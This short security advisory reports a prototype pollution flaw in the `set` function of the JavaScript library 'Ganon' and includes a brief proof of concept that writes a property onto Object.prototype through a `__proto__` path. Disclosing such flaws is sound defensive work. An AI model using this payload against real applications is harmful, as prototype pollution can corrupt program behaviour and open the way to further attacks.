# Overview
`Ganon` is a javascript library designed and maintained by open source contributors. 

Affected versions of this package are vulnerable to Prototype Pollution via the `set` function in `set.js`. 
It can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.


# Proof of Concept

```js
const set = require('ganon/dist/set');

set({}, "__proto__.polluted", true);
console.log(polluted);
```
